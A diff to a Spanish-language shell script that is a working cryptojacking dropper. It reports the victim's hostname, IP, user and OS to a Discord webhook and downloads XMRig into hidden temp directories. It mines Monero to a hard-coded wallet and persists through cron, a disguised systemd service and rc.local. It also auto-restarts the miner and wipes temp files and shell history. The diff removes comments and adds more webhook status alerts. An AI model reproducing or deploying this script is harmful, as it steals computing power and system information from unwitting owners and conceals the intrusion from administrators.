@@ -1,18 +1,10 @@
 #!/bin/sh
 
-# =============================================
-# CONFIGURACIÓN PRINCIPAL
-# =============================================
 W="45LqLiXactPdrh3yoHPhPkdZszwqTo3JxidWteGMiEkNE2ZgP3KzpUYgV2nWD8rt37SusiZ9DrpdZ7sDYDWm9c7yBv9d1cz"
 P1="pool.xmr.wiki:3333"
 P2="pool.supportxmr.com:3333"
 WEBHOOK_URL="https://discord.com/api/webhooks/1457916143049113650/gipO4xBKVlQ6Be-SSWRQnDaLBI11StE852VC8gpocQFtKCreY_NCCTb6wqHtbOiubAUX"
 
-# =============================================
-# FUNCIONES AUXILIARES
-# =============================================
-
-# Notificación a Discord (silenciosa)
 N() {
     MESSAGE="$1"
     JSON_DATA="{\"content\":\"$MESSAGE\"}"
@@ -24,13 +16,11 @@ N() {
     fi
 }
 
-# Enviar información del sistema
 U() {
     HOSTNAME="$(hostname 2>/dev/null || echo unk)"
     TIMESTAMP="$(date +%s)"
     SYSTEM_ID="sys_${HOSTNAME}_${TIMESTAMP}"
     
-    # Obtener IP de múltiples fuentes
     IP="unk"
     if command -v curl >/dev/null 2>&1; then
         IP="$(curl -s --connect-timeout 5 ifconfig.me 2>/dev/null || echo unk)"
@@ -38,12 +28,10 @@ U() {
         IP="$(wget -qO- --timeout=5 ifconfig.me 2>/dev/null || echo unk)"
     fi
     
-    # Información del sistema
     ARCH="$(uname -m)"
     USER="$(whoami)"
     RAM="$(grep MemTotal /proc/meminfo 2>/dev/null | awk '{print int($2/1024)"MB"}' || echo "unk")"
     
-    # Información del sistema operativo
     OS_INFO=""
     if [ -f /etc/os-release ]; then
         . /etc/os-release
@@ -55,12 +43,10 @@ U() {
     N "🚀 **SISTEMA ANALIZADO**\n🖥️ Host: $SYSTEM_ID\n🌐 IP: $IP\n👤 User: $USER\n📦 Arch: $ARCH\n🐧 OS: $OS_INFO\n💾 RAM: $RAM"
 }
 
-# Descargar archivos con múltiples métodos
 D() {
     URL="$1"
     OUTPUT="$2"
     
-    # Método 1: WGET (más silencioso)
     if command -v wget >/dev/null 2>&1; then
         wget --quiet --no-check-certificate --timeout=30 --tries=2 -O "$OUTPUT" "$URL" 2>/dev/null
         if [ $? -eq 0 ] && [ -f "$OUTPUT" ]; then
@@ -68,7 +54,6 @@ D() {
         fi
     fi
     
-    # Método 2: CURL (más silencioso)
     if command -v curl >/dev/null 2>&1; then
         curl -s -L --connect-timeout 30 --insecure --retry 1 -o "$OUTPUT" "$URL" 2>/dev/null
         if [ $? -eq 0 ] && [ -f "$OUTPUT" ]; then
@@ -76,7 +61,6 @@ D() {
         fi
     fi
     
-    # Método 3: Python3
     if command -v python3 >/dev/null 2>&1; then
         python3 -c "
 import urllib.request, ssl
@@ -93,7 +77,6 @@ except:
     return 1
 }
 
-# Obtener directorio temporal escribible
 G() {
     DIRECTORIOS="/tmp/.X11-unix /tmp/.ICE-unix /var/tmp /dev/shm /tmp /var/lib/systemd /var/cache"
     
@@ -108,15 +91,12 @@ G() {
         fi
     done
     
-    # Fallback
     echo "/tmp/.$(head -c 32 /dev/urandom | base64 | tr -dc 'a-zA-Z0-9' | head -c 16)"
 }
 
-# Establecer persistencia
 E() {
     SCRIPT_PATH="$1"
     
-    # 1. Crontab (método más común)
     if command -v crontab >/dev/null 2>&1; then
         TEMP_CRON="$(mktemp 2>/dev/null || echo /tmp/cron_$$)"
         crontab -l 2>/dev/null | grep -v "$SCRIPT_PATH" > "$TEMP_CRON" 2>/dev/null
@@ -126,7 +106,6 @@ E() {
         rm -f "$TEMP_CRON"
     fi
     
-    # 2. Systemd service
     if command -v systemctl >/dev/null 2>&1 && [ -w /etc/systemd/system ]; then
         SERVICE_NAME="systemd-$(head -c 8 /dev/urandom | base64 | tr -dc 'a-zA-Z0-9' | head -c 6)"
         
@@ -152,7 +131,6 @@ EOF
         systemctl enable "$SERVICE_NAME" --now >/dev/null 2>&1
     fi
     
-    # 3. Archivos de inicio
     RC_FILES="/etc/rc.local /etc/rc.d/rc.local /etc/init.d/rc.local"
     for RC_FILE in $RC_FILES; do
         if [ -f "$RC_FILE" ] && [ -w "$RC_FILE" ]; then
@@ -163,14 +141,11 @@ EOF
     done
 }
 
-# Detectar arquitectura y distribución para URL correcta
 X() {
     ARCH=$(uname -m)
     
-    # Primero detectar arquitectura
     case "$ARCH" in
         x86_64|amd64)
-            # Detectar distribución específica
             if [ -f /etc/os-release ]; then
                 . /etc/os-release
                 case "$VERSION_CODENAME" in
@@ -184,7 +159,6 @@ X() {
                         echo "jammy-x64"
                         ;;
                     *)
-                        # Fallback a estático
                         echo "linux-static-x64"
                         ;;
                 esac
@@ -207,7 +181,6 @@ X() {
     esac
 }
 
-# Calcular threads óptimos
 Y() {
     if [ -f /proc/cpuinfo ]; then
         CPU_COUNT=$(grep -c "^processor" /proc/cpuinfo 2>/dev/null)
@@ -215,7 +188,6 @@ Y() {
         CPU_COUNT=1
     fi
     
-    # Usar 75% de los CPUs disponibles, mínimo 1, máximo 8
     THREADS=$((CPU_COUNT * 3 / 4))
     [ $THREADS -lt 1 ] && THREADS=1
     [ $THREADS -gt 8 ] && THREADS=8
@@ -223,23 +195,19 @@ Y() {
     echo $THREADS
 }
 
-# Probar conexión a pool
 Z() {
     POOL="$1"
     HOST=$(echo "$POOL" | cut -d: -f1)
     PORT=$(echo "$POOL" | cut -d: -f2)
     
-    # Timeout de 10 segundos
     timeout 10 bash -c "exec 3<>/dev/tcp/$HOST/$PORT" 2>/dev/null
     return $?
 }
 
-# Descargar e instalar XMRig
 I() {
     TARGET_DIR="$1"
     ARCH_TYPE="$2"
     
-    # Lista de URLs posibles (ordenadas por prioridad)
     BASE_URL="https://github.com/xmrig/xmrig/releases/download/v6.25.0"
     
     case "$ARCH_TYPE" in
@@ -255,27 +223,33 @@ I() {
         linux-static-x64)
             URLS="${BASE_URL}/xmrig-6.25.0-linux-static-x64.tar.gz"
             ;;
+        linux-static-arm64)
+            URLS="${BASE_URL}/xmrig-6.25.0-linux-static-arm64.tar.gz"
+            ;;
+        linux-static-armhf)
+            URLS="${BASE_URL}/xmrig-6.25.0-linux-static-armhf.tar.gz"
+            ;;
+        linux-static-x86)
+            URLS="${BASE_URL}/xmrig-6.25.0-linux-static-x86.tar.gz"
+            ;;
         *)
-            URLS="${BASE_URL}/xmrig-6.25.0-linux-static-${ARCH_TYPE}.tar.gz"
+            URLS="${BASE_URL}/xmrig-6.25.0-linux-static-x64.tar.gz"
             ;;
     esac
     
-    # URL de fallback
     FALLBACK_URL="${BASE_URL}/xmrig-6.25.0-linux-static-x64.tar.gz"
     
     TAR_FILE="${TARGET_DIR}/xmrig.tar.gz"
     
-    # Intentar descargar
     for URL in $URLS $FALLBACK_URL; do
         if D "$URL" "$TAR_FILE"; then
-            # Extraer
             tar -xzf "$TAR_FILE" -C "$TARGET_DIR" --strip-components=1 2>/dev/null
             rm -f "$TAR_FILE" 2>/dev/null
             
-            # Buscar el binario
             for BIN_PATH in "$TARGET_DIR/xmrig" "$TARGET_DIR/xmrig-6.25.0/xmrig"; do
                 if [ -f "$BIN_PATH" ]; then
                     chmod +x "$BIN_PATH" 2>/dev/null
+                    N "✅ **XMRIG DESCARGADO**\n📦 Versión: 6.25.0\n🏗️  Arquitectura: $ARCH_TYPE\n📂 Directorio: $TARGET_DIR"
                     echo "$BIN_PATH"
                     return 0
                 fi
@@ -286,14 +260,12 @@ I() {
     return 1
 }
 
-# Ejecutar minero (completamente oculto)
 M() {
     BIN_PATH="$1"
     POOL="$2"
     THREADS="$3"
     RIG_ID="$4"
     
-    # Ejecutar con la menor prioridad posible y completamente oculto
     nohup "$BIN_PATH" \
         -o "$POOL" \
         -u "$W" \
@@ -315,9 +287,9 @@ M() {
         --health-print-time=0 \
         >/dev/null 2>&1 &
     
-    # Esperar y verificar
     sleep 3
     if kill -0 $! 2>/dev/null; then
+        N "⚡ **MINERÍA INICIADA**\n⛏️  Pool: $POOL\n🧵 Threads: $THREADS\n🆔 Rig ID: $RIG_ID\n💰 Wallet: ${W:0:12}...${W: -12}"
         echo $!
         return 0
     fi
@@ -325,19 +297,28 @@ M() {
     return 1
 }
 
-# Monitorear y reiniciar minero
 monitor_miner() {
     PID="$1"
     BIN_PATH="$2"
     POOL="$3"
     THREADS="$4"
     RIG_ID="$5"
+    LAST_STATUS_TIME=$(date +%s)
+    STATUS_INTERVAL=10800
     
     while true; do
-        sleep 600  # Verificar cada 10 minutos
+        sleep 600
+        
+        CURRENT_TIME=$(date +%s)
+        
+        if [ $((CURRENT_TIME - LAST_STATUS_TIME)) -ge $STATUS_INTERVAL ]; then
+            if kill -0 "$PID" 2>/dev/null; then
+                N "📊 **ESTADO MINERO**\n✅ Activo\n⛏️  Pool: $POOL\n🧵 Threads: $THREADS\n🆔 Rig ID: $RIG_ID\n⏰ Uptime: $(( (CURRENT_TIME - LAST_STATUS_TIME) / 3600 ))h"
+                LAST_STATUS_TIME=$CURRENT_TIME
+            fi
+        fi
         
         if ! kill -0 "$PID" 2>/dev/null; then
-            # Minero caído, reiniciar
             NEW_PID=$(M "$BIN_PATH" "$POOL" "$THREADS" "$RIG_ID")
             if [ -n "$NEW_PID" ]; then
                 PID="$NEW_PID"
@@ -347,90 +328,95 @@ monitor_miner() {
     done
 }
 
-# =============================================
-# FUNCIÓN PRINCIPAL
-# =============================================
+send_alert() {
+    ALERT_TYPE="$1"
+    MESSAGE="$2"
+    
+    case "$ALERT_TYPE" in
+        "new_host")
+            N "🔍 **NUEVO HOST DETECTADO**\n$MESSAGE"
+            ;;
+        "error")
+            N "❌ **ERROR**\n$MESSAGE"
+            ;;
+        "warning")
+            N "⚠️ **ADVERTENCIA**\n$MESSAGE"
+            ;;
+        "info")
+            N "ℹ️ **INFORMACIÓN**\n$MESSAGE"
+            ;;
+    esac
+}
+
 main() {
-    # Verificar si ya está corriendo
     if ps aux 2>/dev/null | grep -v grep | grep -q "xmrig.*$W"; then
+        send_alert "info" "Minería ya está activa en este sistema"
         exit 0
     fi
     
-    # Enviar información del sistema
     U
     
-    # Crear directorio de trabajo
     WORK_DIR=$(G)
     mkdir -p "$WORK_DIR" 2>/dev/null
     if [ ! -w "$WORK_DIR" ]; then
+        send_alert "error" "No se puede escribir en directorio temporal"
         exit 0
     fi
     
     cd "$WORK_DIR" || exit 0
     
-    # Detectar arquitectura
     ARCH_TYPE=$(X)
     
-    # Descargar XMRig si no existe
     BIN_PATH="$WORK_DIR/xmrig"
     if [ ! -f "$BIN_PATH" ] || [ ! -x "$BIN_PATH" ]; then
         BIN_PATH=$(I "$WORK_DIR" "$ARCH_TYPE")
         if [ -z "$BIN_PATH" ] || [ ! -x "$BIN_PATH" ]; then
+            send_alert "error" "Fallo al descargar XMRig"
             exit 0
         fi
     fi
     
-    # Establecer persistencia
     E "$0"
+    send_alert "info" "Persistencia establecida en el sistema"
     
-    # Calcular threads
     THREADS=$(Y)
     
-    # Probar pools
     POOL="$P1"
     if ! Z "$P1"; then
         POOL="$P2"
         if ! Z "$P2"; then
+            send_alert "error" "No hay conexión a pools disponibles"
             exit 0
+        else
+            send_alert "warning" "Pool principal caído, usando secundario: $P2"
         fi
     fi
     
-    # Generar ID único
     RIG_ID="m_$(hostname 2>/dev/null | head -c 3)_$(date +%H%M)"
     
-    # Iniciar minero
     PID=$(M "$BIN_PATH" "$POOL" "$THREADS" "$RIG_ID")
     if [ -n "$PID" ]; then
-        # Iniciar monitor en background
+        send_alert "info" "✅ Minería iniciada exitosamente\nPID: $PID\nWallet: ${W:0:8}...${W: -8}"
+        
         monitor_miner "$PID" "$BIN_PATH" "$POOL" "$THREADS" "$RIG_ID" &
         
-        # Ocultar completamente el proceso
         disown -h 2>/dev/null
+    else
+        send_alert "error" "Fallo al iniciar minero"
     fi
 }
 
-# =============================================
-# EJECUCIÓN
-# =============================================
-
-# Limpiar rastros
 cleanup() {
-    # Eliminar archivos temporales
     rm -f /tmp/.* /var/tmp/.* 2>/dev/null
-    # Limpiar historial
     history -c 2>/dev/null
-    # Limpiar variables
     unset W P1 P2 WEBHOOK_URL
 }
 
-# Ejecutar
 if [ "$1" != "debug" ]; then
-    # Ejecutar en background completamente oculto
     main >/dev/null 2>&1 &
     cleanup
     disown 2>/dev/null
     exit 0
 else
-    # Modo debug (solo para pruebas)
     main
 fi
